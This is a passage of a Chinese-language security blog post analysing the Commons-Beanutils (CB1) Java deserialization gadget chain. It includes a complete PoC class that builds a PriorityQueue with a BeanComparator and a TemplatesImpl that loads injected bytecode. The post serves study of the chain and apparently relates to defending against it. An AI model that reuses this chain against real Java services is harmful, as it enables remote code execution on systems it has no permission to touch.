+<p>跟着cc2链，继续使用<code>PriorityQueue</code>类，它的<code>readObject()</code>方法可以触发排序等函数，最终调用<code>comparator</code>变量的<code>compare()</code> 方法</p>
+<p>并且形参传入<code>TemplatesImpl</code>对象（注意讲<code>BeanComparator</code>的<code>property</code>设置为<code>outputProperties</code>）</p>
+<p><code>PriorityQueue#siftDownUsingComparator()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>comparator.<span style="color:#a6e22e">compare</span>((E) c, (E) queue<span style="color:#f92672">[</span>right<span style="color:#f92672">]</span>) <span style="color:#f92672">&gt;</span> 0)
+</span></span></code></pre></div><p>当反序列化时调用<code>PriorityQueue#readObject()</code>方法，最终调用<code>comparator#compare()</code>，然后调用<code>TemplatesImpl#getOutputProperties()</code>方法</p>
+<h3 id="构造poc">构造poc</h3>
+<p>首先是创建TemplatesImpl</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>CtClass clazzz <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;EvilTest&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> clazzz.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{code});
+</span></span><span style="display:flex;"><span>setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span></code></pre></div><p>然后创建<code>BeanComparator</code>和<code>PriorityQueue</code>，因为要把<code>TemplatesImpl对象</code>传入<code>BeanComparator</code>进行比较</p>
+<p>所以得把<code>TemplatesImpl对象</code>传入传入<code>PriorityQueue的queue</code></p>
+<p>把<code>BeanComparator</code>传入<code>PriorityQueue的comparator</code></p>
+<p>然后就是CB的核心点，我们得把property传值为<code>outputProperties</code>，这样调用getProperty就会触发到<code>TemplatesImpl#getOutputProperties()</code>进入到利用链</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator();
+</span></span><span style="display:flex;"><span>PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(2, comparator);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// stub data for replacement later</span>
+</span></span><span style="display:flex;"><span>queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>setFieldValue(comparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>setFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{obj, obj});
+</span></span></code></pre></div><p>到这里CB链就构造完成了，下面就可以序列化PriorityQueue对象了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">cb1</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass clazzz <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;EvilTest&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> clazzz.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{code});
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator();
+</span></span><span style="display:flex;"><span>        PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(2, comparator);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// stub data for replacement later</span>
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>        setFieldValue(comparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{obj, obj});
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(queue);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(barr);
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> ByteArrayInputStream(barr.<span style="color:#a6e22e">toByteArray</span>()));
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> (Object)ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>参考：</p>
+<p>java安全 漫谈</p>
+<p><a href="https://blog.huamang.xyz/post/cb1/" target="_blank" rel="noopener noreffer">https://blog.huamang.xyz/post/cb1/</a>
+</p>
+<p><a href="http://leekos.fun/index.php/archives/232/" target="_blank" rel="noopener noreffer">http://leekos.fun/index.php/archives/232/</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-title="java安全 CB1利用链分析" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-title="java安全 CB1利用链分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-title="java安全 CB1利用链分析"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-title="java安全 CB1利用链分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" class="prev" rel="prev" title="java安全 CC2链"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java安全 CC2链</a>
+            <a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-rmi/" class="next" rel="next" title="java安全 RMI">java安全 RMI<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
